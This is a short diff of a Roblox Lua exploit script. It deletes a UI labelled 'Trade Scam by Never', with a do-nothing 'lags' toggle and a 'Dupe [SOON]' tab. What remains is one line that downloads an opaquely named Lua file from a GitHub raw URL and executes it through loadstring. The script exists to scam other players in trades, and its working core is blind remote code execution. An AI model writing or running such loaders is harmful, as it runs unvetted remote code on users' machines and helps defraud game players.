@@ -1,17 +1,1 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()
-local Window = Library.CreateLib("Trade Scam by Never", "RJTheme3")
-local Tab = Window:NewTab("Trade")
-local Section = Tab:NewSection("Trade Scam")
-
-Section:NewToggle("on/off lags", "", function(state)
-    if state then
-        print("Toggle On")
-    else
-        print("Toggle Off")
-    end
-end)
-
-local Tab = Window:NewTab("Dupe [SOON]")
-
-getgenv().gui = false
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts-Z/Scripts/main/3518I4VNSQW2.lua"))()
